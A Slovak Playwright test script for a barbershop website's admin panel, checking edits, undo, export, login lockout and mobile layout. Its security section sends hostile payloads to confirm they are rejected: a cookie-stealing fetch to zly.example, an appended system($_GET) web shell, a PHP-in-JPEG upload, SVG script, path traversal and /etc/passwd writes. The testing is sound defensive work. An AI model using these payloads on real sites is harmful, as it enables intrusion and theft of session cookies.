  ok(citaj('index.html').includes('tel:+421911222333') && citaj('en/index.html').includes('tel:+421911222333') && citaj('karta/index.html').includes('data-api="/vernost/api/"'), 'telefón v slovenskej aj anglickej stránke; stránka kartičky ostala zostavená pre doménu');
  { const s = await (await u.request.get(Z + '/asistent/api.php?a=stav')).json(); const v = await (await u.request.get(Z + '/vernost/api/?a=stav')).json(); ok(s.zapnute === true && v.databaza === true, 'servery po zmene súborov s kódom bežia ďalej'); }

  // odpovede asistenta
  await u.click('#tabs button[data-tab="odpovede"]');
  const odpPole = u.locator('.tab[data-tab="odpovede"] .blk textarea').first();
  const odp0 = await odpPole.inputValue();
  await odpPole.fill(odp0.replace(/\.?\s*$/, '') + ' Tešíme sa na teba.');
  await odpPole.dispatchEvent('input');
  sprava = await uloz(u);
  ok(/^Uložené/.test(sprava) && fs.readFileSync(path.join(WEB, 'asistent/znalosti/barbershop-otazky.json'), 'utf8').includes('Tešíme sa na teba.') && citaj('assets/asistent-otazky.json').includes('Tešíme sa na teba.'), 'uloženie 3 (odpoveď asistenta): v znalostiach servera aj v kópii pre web', sprava);

  /* ---------- 4. súbeh dvoch úprav ---------- */
  console.log('\n4. súbeh');
  {
    const d = await up.ctx.newPage(); d.on('dialog', (x) => x.accept());
    await d.goto(Z + '/sprava/upravy/'); await d.waitForSelector('#app:not([hidden]) .tab[data-tab="texty"] .blk', { timeout: 30000 });
    // text, ktorý je naozaj na stránke (nie len v presmerovaní rezervacia.html) a ešte sa nemenil
    const kandidati = await u.$$eval('.tab[data-tab="texty"] .blk input, .tab[data-tab="texty"] .blk textarea', (e) => e.map((x) => x.value).filter((v) => v.length > 40 && /\.$/.test(v)));
    const terajsi = n(citaj('index.html')), veta = kandidati.find((v) => terajsi.includes('>' + n(v) + '<') && !v.includes('dnes'));
    const zmen = (p, pridaj) => p.evaluate(({ v, pr }) => { const el = [...document.querySelectorAll('.tab[data-tab="texty"] .blk input, .tab[data-tab="texty"] .blk textarea')].find((x) => x.value === v); el.value = v.replace(/\.$/, pr); el.dispatchEvent(new Event('input')); }, { v: veta, pr: pridaj });
    await u.click('#tabs button[data-tab="texty"]'); await zmen(u, ' prvá.'); await zmen(d, ' druhá.');
    const s1 = await uloz(u), pred = citaj('index.html'), s2 = await uloz(d);
    ok(/^Uložené/.test(s1) && /zmenil inde/.test(s2) && citaj('index.html') === pred, 'druhé uloženie zo starej verzie nič neprepíše a povie to', s2);
    await d.close();
  }

  /* ---------- krok späť ---------- */
  console.log('\nkrok späť');
  const predSpat = citaj('index.html'), predSpatEn = citaj('en/index.html');
  await page.goto(Z + '/sprava/');
  await tlacidlo(page, 'spat');
  { const h = citaj('index.html'); ok(/ako pred posledným uložením/.test(await hlaska(page)) && h !== predSpat && predSpat.includes('prvá.') && !h.includes('prvá.') && h.includes('tel:+421911222333'), 'krok späť vráti posledné uloženie (staršie úpravy ostávajú)', `${h !== predSpat} ${predSpat.includes('prvá.')} ${!h.includes('prvá.')} ${h.includes('tel:+421911222333')}`); }
  ok(htmlTag('index.html').includes('data-asistent=') && zapnute('index.html'), 'krok späť nechá prepínače zapnuté');
  await tlacidlo(page, 'spat');
  ok(/Krok späť je vrátený/.test(await hlaska(page)) && citaj('index.html') === predSpat && citaj('en/index.html') === predSpatEn, 'krok späť sa dá vrátiť (obe stránky bajt po bajte)');
  await page.goto(Z + '/sprava/?s=historia');
  ok((await page.locator('ul.body li').count()) >= 5 && /Krok späť/.test(await text(page)), 'história: uloženia aj kroky späť', String(await page.locator('ul.body li').count()));
  await u.reload(); await u.waitForSelector('#app:not([hidden]) .tab[data-tab="texty"] .blk', { timeout: 30000 });
  ok(await u.evaluate(() => [...document.querySelectorAll('.tab[data-tab="texty"] .blk input, .tab[data-tab="texty"] .blk textarea')].some((x) => / prvá\.$/.test(x.value))), 'úpravy po obnovení stránky vidia aktuálny stav');
  await up.ctx.close();

  /* ---------- 5. export a prevzatie do kópie repozitára ---------- */
  console.log('\n5. export');
  await page.goto(Z + '/sprava/');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.click('form:has(input[name=a][value="export"]) button')]);
  const zip = path.join(T, 'export.zip'); await dl.saveAs(zip);
  const obsah = spawnSync('unzip', ['-Z1', zip], { encoding: 'utf8' }).stdout.split('\n').filter(Boolean);
  ok(obsah.includes('barbershop-30/index.html') && obsah.includes('asistent/znalosti/barbershop.md') && obsah.includes('barbershop-30/assets/app.js') && obsah.includes('BALIK.txt') && obsah.includes('ZMENY.json') && obsah.filter((x) => /assets\/img\/tim-/.test(x)).length === 4, 'export: súbory na cestách repozitára, nové fotky, BALIK.txt, ZMENY.json', `${obsah.length} položiek`);
  const vsetko = spawnSync('unzip', ['-p', zip], { encoding: 'latin1', maxBuffer: 1 << 28 }).stdout;
  ok(!obsah.some((x) => /tajne|ucty|pristup|nastavenie\.php|relacie|sqlite|dennik|PRVY|OBNOVA/.test(x)) && !vsetko.includes(KLUC) && !vsetko.includes(RECEPCIA) && !/\$2y\$|\$argon2/.test(vsetko) && !vsetko.includes('"kto"'), 'export: žiadne tajomstvo, účet, databáza ani meno účtu');
  { const ei = spawnSync('unzip', ['-p', zip, 'barbershop-30/index.html'], { encoding: 'utf8', maxBuffer: 1 << 26 }).stdout; ok(ei.includes('d8f5s88zjy-art.github.io') && /<html lang="sk" data-motion="on">/.test(ei) && /<script src="assets\/vernost\.js" data-prevadzka="barbershop" defer/.test(ei) && /<!--/.test(ei), 'export: index.html je zdroj v tvare repozitára (adresa GitHub Pages, komentáre, bez prepínačov)'); }
  if (!opt['bez-exportu']) {
    const K = path.join(T, 'repo'); fs.mkdirSync(K);
    const ar = spawnSync('sh', ['-c', `git -C "${ROOT}" archive HEAD barbershop-30 asistent vernost CLAUDE.md | tar -x -C "${K}"`]);
    // kópia má stav pracovného stromu (aj necommitnuté zmeny nástrojov a správy)
    for (const c of ['barbershop-30/admin', 'barbershop-30/source/tools', 'barbershop-30/source/domena']) fs.cpSync(path.join(ROOT, c), path.join(K, c), { recursive: true });
    const pr = spawnSync('node', [path.join(SITE, 'source', 'tools', 'prevezmi-export.mjs'), zip, `--do=${K}`, '--bez-testov'], { encoding: 'utf8' });
    ok(ar.status === 0 && pr.status === 0 && /HOTOVO/.test(pr.stdout), 'prevezmi-export.mjs export prijme', (pr.stdout + pr.stderr).trim().split('\n').slice(-2).join(' | ').slice(0, 200));
    const kIdx = fs.readFileSync(path.join(K, 'barbershop-30/index.html'), 'utf8');
    ok(kIdx.includes('tel:+421911222333') && n(kIdx).includes(n(novyText)) && fs.existsSync(path.join(K, 'barbershop-30/assets/img', fotky[0])), 'kópia repozitára má úpravy majiteľa a nové fotky');
    const chk = spawnSync('node', ['source/tools/en-stranka.mjs', '--check'], { cwd: path.join(K, 'barbershop-30'), encoding: 'utf8' });
    ok(chk.status === 0, 'v kópii repozitára: en-stranka.mjs --check', chk.stdout.trim());
    const at = spawnSync('node', ['source/tools/admin-test.mjs', `--out=${path.join(T, 'admin-snimky')}`], { cwd: path.join(K, 'barbershop-30'), encoding: 'utf8', maxBuffer: 1 << 26 });
    // admin-test má kontakt a hodiny z repozitára napevno (0951 267 203, 9–19) a CLAUDE.md na hostingu nie je: po zmene kontaktu
    // majiteľom smú zlyhať len tieto tri kontroly (prevezmi-export.mjs na ne upozorní), všetko ostatné musí prejsť
    const atZle = at.stdout.split('\n').filter((l) => /^FAIL/.test(l)), atOk = at.stdout.split('\n').filter((l) => /^OK/.test(l)).length;
    const zname = [/^FAIL kontakt načítaný z webu/, /^FAIL hodiny načítané z app\.js/, /^FAIL CLAUDE\.md: pravidlo s novými hodinami/];
    ok(atOk >= 95 && atZle.every((l) => zname.some((z) => z.test(l))) && /POZOR: zmenil sa kontakt alebo hodiny/.test(pr.stdout), `v kópii repozitára: admin-test.mjs (GitHub) prejde aj s úpravami majiteľa (${atOk} OK; kontroly pôvodného kontaktu a CLAUDE.md po zmene kontaktu: ${atZle.length})`, at.stdout.split('\n').filter((l) => /^FAIL/.test(l)).join(' | ').slice(0, 900) || at.stdout.trim().split('\n').pop());
  }

  /* ---------- 6c. odstránenie kľúča ---------- */
  console.log('\n6c. odstránenie kľúča');
  await page.goto(Z + '/sprava/?s=nastavenia');
  await tlacidlo(page, 'asistent-odstranit');
  ok(/Kľúč je odstránený/.test(await hlaska(page)) && !/data-asistent/.test(htmlTag('index.html')) && !/data-asistent/.test(htmlTag('en/index.html')) && !fs.readFileSync(path.join(UDAJE, 'tajne.php'), 'utf8').includes(KLUC), 'kľúč zmazaný z údajov, prepínač asistenta preč z oboch stránok');
  ok(htmlTag('index.html').includes('data-objednavka=') && zapnute('index.html'), 'ostatné funkcie ostali zapnuté');
  { const s = await (await page.request.get(Z + '/asistent/api.php?a=stav')).json(); const o = await okno(1280, 900); await o.page.goto(Z + '/'); await sleep(3000); ok(s.zapnute === false && s.kalendar === true && await o.page.locator('.asi-btn').count() === 0, 'web: asistent zmizol, kalendár beží ďalej'); await o.ctx.close(); }

  /* ---------- 9. bezpečnosť cez HTTP ---------- */
  console.log('\n9. bezpečnosť');
  const bez = await browser.newContext(); const rq = bez.request;
  ok((await rq.get(Z + '/sprava/api.php?a=stav')).status() === 401 && (await rq.post(Z + '/sprava/api.php?a=uloz', { data: {} })).status() === 401, 'api.php bez relácie: 401');
  const csrf = (await (await page.request.get(Z + '/sprava/api.php?a=stav')).json()).csrf;
  ok((await page.request.post(Z + '/sprava/api.php?a=uloz', { data: { verzia: 'x' } })).status() === 403, 'api.php s reláciou, ale bez tokenu: 403');
  ok((await page.request.post(Z + '/sprava/api.php?a=citaj', { headers: { 'X-B30-CSRF': csrf, Origin: 'https://zly.example' }, data: { cesty: [] } })).status() === 403, 'api.php s cudzím pôvodom: 403');
  ok((await page.request.post(Z + '/sprava/', { form: { a: 'zverejnit', _t: 'zly' } })).status() === 403, 'formulár správy bez platného tokenu: 403');
  const verzia = (await (await page.request.get(Z + '/sprava/api.php?a=stav')).json()).verzia;
  const pokus = async (telo) => { const r = await page.request.post(Z + '/sprava/api.php?a=uloz', { headers: { 'X-B30-CSRF': csrf }, data: { verzia, sprava: 'útok', ...telo } }); return [r.status(), (await r.json().catch(() => ({}))).chyba || '']; };
  const utoky = [
    ['cesta mimo tabuľky (nový súbor PHP)', { subory: { 'sprava/zadne-dvierka.php': '<?php phpinfo();' } }],
    ['cesta s ../', { subory: { 'barbershop-30/../index.php': '<?php' } }],
    ['absolútna cesta', { subory: { '/etc/passwd': 'x' } }],
    ['rezervačný systém index.php', { subory: { 'index.php': '<?php' } }],
    ['koreňový .htaccess', { subory: { '.htaccess': 'x' } }],
    ['program v súbore s kódom', { subory: { 'asistent/api.php': citaj('asistent/api.php') + "\nsystem($_GET['x']);" } }],
    ['program v app.js', { subory: { 'barbershop-30/assets/app.js': citaj('assets/app.js') + '\nfetch("https://zly.example/" + document.cookie);' } }],
    ['značka PHP v HTML', { subory: { 'barbershop-30/rezervacia.html': '<html><?php echo 1; ?></html>' } }],
    ['neplatný JSON', { subory: { 'barbershop-30/assets/i18n/en.json': '{zle' } }],
    ['verejný súbor mimo zostavenia', { verejne: { 'index.php': '<?php' } }],
    ['verejná stránka s programom', { verejne: { 'index.html': citaj('index.html').replace('</body>', '<?php echo 1; ?></body>') } }],
    ['fotka bez nahratia', { fotky: { 'barbershop-30/assets/img/x-480.webp': '0'.repeat(32) } }],
  ];
  const predUtokmi = strom(WEB);
  for (const [meno, telo] of utoky) { const [st, ch] = await pokus(telo); ok(st === 400 && ch.length > 5, `útok odmietnutý: ${meno}`, `${st} ${ch.slice(0, 70)}`); }
  { const r = await page.request.post(Z + '/sprava/api.php?a=fotka', { headers: { 'X-B30-CSRF': csrf }, data: { cesta: 'barbershop-30/assets/img/zly-480.jpg', b64: Buffer.from('\xff\xd8\xff\xe0<?php system($_GET[1]); ?>', 'latin1').toString('base64') } }); ok(r.status() === 400, 'fotka, ktorá nie je obrázok (PHP s hlavičkou JPEG): odmietnutá'); }
  { const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>').toString('base64'); const r = await page.request.post(Z + '/sprava/api.php?a=fotka', { headers: { 'X-B30-CSRF': csrf }, data: { cesta: 'barbershop-30/assets/img/zly-480.webp', b64: svg } }); const r2 = await page.request.post(Z + '/sprava/api.php?a=fotka', { headers: { 'X-B30-CSRF': csrf }, data: { cesta: 'barbershop-30/assets/zly.php', b64: svg } }); ok(r.status() === 400 && r2.status() === 400, 'SVG a meno mimo vzoru fotky: odmietnuté'); }
  const poUtokoch = strom(WEB);
  ok(JSON.stringify(predUtokmi) === JSON.stringify(poUtokoch), 'po útokoch sa na webe nezmenil ani nepribudol žiadny súbor');
  const zakazane = ['/sprava/jadro/Miesto.php', '/sprava/jadro/ciel.json', '/sprava/obrazovky/sprava.php', '/sprava/semeno/verzia.json', '/sprava/semeno/asistent/api.php.txt', '/sprava/.user.ini', '/asistent/lib/jadro.php', '/asistent/config.php', '/asistent/vendor/autoload.php', '/asistent/znalosti/barbershop.md', '/asistent/subory.sha256', '/asistent/.user.ini', '/vernost/lib/jadro.php', '/vernost/config.php', '/vernost/data/x.sqlite'];
  const otvorene = [];
  for (const c of zakazane) { const r = await rq.get(Z + c); if (r.status() < 400) otvorene.push(c); }
  ok(otvorene.length === 0, 'vnútorné súbory balíka sú z webu zakázané', otvorene.join(' '));
  const vsetkyUdaje = Object.keys(strom(UDAJE));
  ok(!vsetkyUdaje.some((f) => f !== 'tajne.php' && fs.readFileSync(path.join(UDAJE, f)).includes(KLUC.slice(7))) , 'kľúč nebol nikde v údajoch okrem tajne.php (denník, zálohy, export)');
  await bez.close();

  /* ---------- údaje v koreni webu (hosting bez zápisu nad koreň): ochrana priečinka ---------- */
  console.log('\núdaje v koreni webu');
  {
    const W2 = path.join(T, 'web2'); fs.cpSync(BALIK, W2, { recursive: true });
    const P2 = P1 + 1, Z2 = `http://127.0.0.1:${P2}`;
    const s2 = spawn('php', ['-S', `127.0.0.1:${P2}`, '-t', W2, path.join(ROOT, 'barbershop-sprava', 'testy', 'router.php')], { env: { ...env, B30_TEST_UDAJE_VO_WEBE: '1' }, cwd: W2, stdio: 'ignore' });
    await sleep(900);
    try {
      const c2 = await browser.newContext(); const p2 = await c2.newPage();
      await p2.goto(Z2 + '/sprava/');
      const dir = fs.readdirSync(W2).find((x) => /^b30-udaje-[0-9a-f]{32}$/.test(x));
      ok(!!dir && fs.existsSync(path.join(W2, dir, '.htaccess')) && fs.existsSync(path.join(W2, dir, 'web.config')) && fs.existsSync(path.join(W2, dir, 'relacie/index.html')), 'priečinok údajov s náhodným menom, .htaccess, web.config a prázdnym index.html');
      await Promise.all([p2.waitForNavigation(), p2.click('form:has(input[name=a][value="vytvor-kod"]) button')]);
      ok(fs.existsSync(path.join(W2, dir, 'PRVY-KOD.txt')) && /začína „b30-udaje-“/.test(await p2.evaluate(() => document.querySelector('main').innerText)), 'kód je v súbore v tom priečinku, stránka povie, kde ho hľadať');
      const k = await c2.request.get(`${Z2}/${dir}/PRVY-KOD.txt`), t2 = await c2.request.get(`${Z2}/${dir}/pristup.php`);
      ok(k.status() === 403 && t2.status() === 403, 'súbor s kódom ani údaje sa z webu nedajú prečítať');
      const priamo = spawnSync('php', [path.join(W2, dir, 'pristup.php')], { encoding: 'utf8' });
      ok(priamo.stdout === '', 'súbor údajov spustený priamo (bez ochrany servera) nič nevypíše');
      await c2.close();
    } finally { s2.kill(); }
  }

  /* ---------- 10. telefón 390 px ---------- */
  console.log('\n10. telefón 390 px');
  {
    const cookies = await ctx.cookies();
    ok(cookies.some((c) => c.name === 'b30s' && c.httpOnly && c.sameSite === 'Strict' && c.path === '/sprava/'), 'cookie relácie: HttpOnly, SameSite=Strict, len pre /sprava/');
    const m = await okno(390, 844); await m.ctx.addCookies(cookies); const p = m.page;
    for (const [adresa, meno] of [['/sprava/', 'domov'], ['/sprava/?s=nastavenia', 'nastavenia'], ['/sprava/?s=kontrola', 'kontrola'], ['/sprava/?s=historia', 'historia']]) {
      await p.goto(Z + adresa);
      const r = await p.evaluate(() => ({ preteka: document.documentElement.scrollWidth > innerWidth + 1, male: [...document.querySelectorAll('a.tl, button.tl, .lnk, input:not([type=hidden]):not([type=checkbox]), textarea, .spat a, summary')].filter((e) => { const b = e.getBoundingClientRect(); return b.width > 0 && b.height < 43.5; }).map((e) => (e.textContent || e.name || e.id).trim().slice(0, 20)) }));
      ok(!r.preteka && r.male.length === 0, `správa ${meno}: bez vodorovného pretekania, dotykové plochy aspoň 44 px`, r.male.join(', '));
      await p.screenshot({ path: path.join(OUT, `sprava-${meno}-390.png`), fullPage: true });
    }
    await p.goto(Z + '/sprava/upravy/'); await p.waitForSelector('#app:not([hidden]) .tab[data-tab="texty"] .blk', { timeout: 30000 });
    ok(!(await p.evaluate(() => document.documentElement.scrollWidth > innerWidth + 1)), 'úpravy: bez vodorovného pretekania');
    await p.click('#tabs button[data-tab="karta"]');
    ok((await p.getAttribute('.tab[data-tab="karta"] .links a >> nth=0', 'href')) === '../../vernost/admin/' && /heslom recepcie/.test(await p.textContent('.tab[data-tab="karta"]')), 'úpravy, záložka Kartička: admin kartičiek na tejto doméne');
    await m.ctx.close();
  }

  /* ---------- nový balík: po nahratí sú prepínače vypnuté, Dokončiť aktualizáciu ich vráti ---------- */
  console.log('\nnový balík');
  {
    const upraveny = citaj('index.html');
    for (const c of ['index.html', 'en/index.html']) fs.copyFileSync(path.join(BALIK, c), path.join(WEB, c));       // FTP prepíše stránky
    const vj = JSON.parse(fs.readFileSync(path.join(BALIK, 'sprava/semeno/verzia.json'), 'utf8')); vj.cas = '2027-01-01T00:00:00+00:00';
    fs.writeFileSync(path.join(WEB, 'sprava/semeno/verzia.json'), JSON.stringify(vj));
    ok(!/data-objednavka/.test(htmlTag('index.html')) && !zapnute('index.html'), 'po nahratí novšieho balíka sú prepínače vypnuté (bezpečný smer)');
    await page.goto(Z + '/sprava/');
    ok(/novší balík/.test(await text(page)), 'správa ponúkne Dokončiť aktualizáciu');
    await tlacidlo(page, 'balik-moje');
    ok(/Aktualizácia je dokončená/.test(await hlaska(page)) && htmlTag('index.html').includes('data-objednavka=') && zapnute('index.html') && citaj('index.html').includes('tel:+421911222333'), 'ponechať moje úpravy: úpravy aj prepínače sú späť na webe', await hlaska(page));
    ok(citaj('index.html') === upraveny, 'stránka je bajt po bajte ako pred nahratím balíka');
    for (const c of ['index.html', 'en/index.html']) fs.copyFileSync(path.join(BALIK, c), path.join(WEB, c));
    vj.cas = '2027-02-01T00:00:00+00:00'; fs.writeFileSync(path.join(WEB, 'sprava/semeno/verzia.json'), JSON.stringify(vj));
    await page.goto(Z + '/sprava/'); await tlacidlo(page, 'balik-novy');
    ok(/Aktualizácia je dokončená/.test(await hlaska(page)) && zapnute('index.html') && !citaj('index.html').includes('tel:+421911222333') && Object.keys(strom(path.join(UDAJE, 'zdroj'))).filter((x) => x !== 'index.html').length === 0, 'prevziať nový balík: web z balíka s prepínačmi, moje úpravy v zálohe');
  }

  /* ---------- 1b. odhlásenie, zlé heslo, obnova prístupu, zámok ---------- */
  console.log('\n1b. prihlásenie, obnova, zámok');
  await page.goto(Z + '/sprava/');
  await tlacidlo(page, 'odhlasit');
  ok(/Prihlásenie/.test(await page.title()) && (await page.request.get(Z + '/sprava/api.php?a=stav')).status() === 401, 'odhlásenie: relácia skončila');
  await page.fill('#meno', 'lajko'); await page.fill('#heslo', HESLO); await odosli(page, 'form:has(#heslo) button');
  ok(/Správa webu/.test(await page.title()), 'prihlásenie menom bez ohľadu na veľké písmená');
  await tlacidlo(page, 'odhlasit');
  await page.goto(Z + '/sprava/?s=obnova');
  await tlacidlo(page, 'obnova-kod');
  const kod2 = kod('OBNOVA-KOD.txt');
  await page.fill('#kod', kod2); await odosli(page, 'form:has(#kod) button');
  await page.fill('#heslo', HESLO2); await page.fill('#heslo2', HESLO2); await odosli(page, 'form:has(#heslo) button');
  ok(/Heslo je zmenené/.test(await hlaska(page)) && !fs.existsSync(path.join(UDAJE, 'OBNOVA-KOD.txt')), 'obnova prístupu kódom zo súboru OBNOVA-KOD.txt');
  await tlacidlo(page, 'odhlasit');
  await page.fill('#meno', 'Lajko'); await page.fill('#heslo', HESLO); await odosli(page, 'form:has(#heslo) button');
  ok(/nie je správne/.test(await hlaska(page)), 'staré heslo po obnove neplatí');
  for (let i = 0; i < 4; i++) { await page.fill('#meno', i % 2 ? 'Lajko' : 'niekto'); await page.fill('#heslo', 'zle-heslo-' + i); await odosli(page, 'form:has(#heslo) button'); }
  ok(/Príliš veľa nesprávnych pokusov/.test(await hlaska(page)), 'po 5 zlých pokusoch zámok', await hlaska(page));
  await page.fill('#meno', 'Lajko'); await page.fill('#heslo', HESLO2); await odosli(page, 'form:has(#heslo) button');
  ok(/Príliš veľa/.test(await hlaska(page)) && /Prihlásenie/.test(await page.title()), 'počas zámku neprejde ani správne heslo');
  const dennik = fs.readFileSync(path.join(UDAJE, 'dennik/dennik.jsonl'), 'utf8');
  ok(/"ukon":"prihlasenie-zle"/.test(dennik) && /"ukon":"ulozenie"/.test(dennik) && !dennik.includes(HESLO) && !dennik.includes(HESLO2) && !dennik.includes(RECEPCIA) && !dennik.includes(KLUC) && !/127\.0\.0\.1/.test(dennik), 'denník: úkony áno, heslá, kľúč ani adresa IP nie');
  await ctx.close();

  /* ---------- záver: rezervačný systém nedotknutý ---------- */
  console.log('\nzáver');
  const laravelPo = strom(WEB);
  const zmenene = Object.keys(laravelPred).filter((f) => laravelPo[f] !== laravelPred[f]);
  ok(zmenene.length === 0, 'súbory rezervačného systému (index.php, .htaccess, css, js, images, fonts, storage, vendor) sú bez zmeny', zmenene.join(', '));
  const koniecRez = await (await browser.newContext()).request.get(Z + '/rezervacia');
  ok(koniecRez.status() === 200 && /v-order-component/.test(await koniecRez.text()), '/rezervacia stále ukazuje rezervačný systém');
  const mimo = vonku.filter((x) => !/^https:\/\/(www\.)?(google|maps|instagram|facebook)/.test(x));
  ok(!vonku.some((x) => /barbershop30\.sk|anthropic|headspa30/.test(x)), 'žiadna požiadavka na živú doménu ani na skutočné API', [...new Set(vonku)].slice(0, 4).join(' '));
  const log = fs.readFileSync(path.join(T, 'server.log'), 'utf8');
  const varovania = log.split('\n').filter((r) => /PHP (Warning|Fatal|Deprecated|Notice|Parse)/.test(r));
  ok(varovania.length === 0, 'server bez varovaní PHP', varovania.slice(0, 2).join(' | ').slice(0, 300));
  ok(chyby.length === 0, 'stránky bez chýb skriptu', chyby.slice(0, 3).join(' | ').slice(0, 300));
  if (mimo.length) console.log(`     zastavené požiadavky mimo testu: ${[...new Set(mimo)].length}`);
} catch (e) {
  failed++; console.log('FAIL test spadol: ' + (e && e.stack ? e.stack.split('\n').slice(0, 4).join(' | ') : e));
} finally {
  await browser.close();
}
console.log(`\nVÝSLEDOK: ${failed ? `${failed} FAIL z ${pocet}` : `všetko v poriadku (${pocet} kontrol)`} · snímky: ${OUT}`);
process.exit(failed ? 1 : 0);
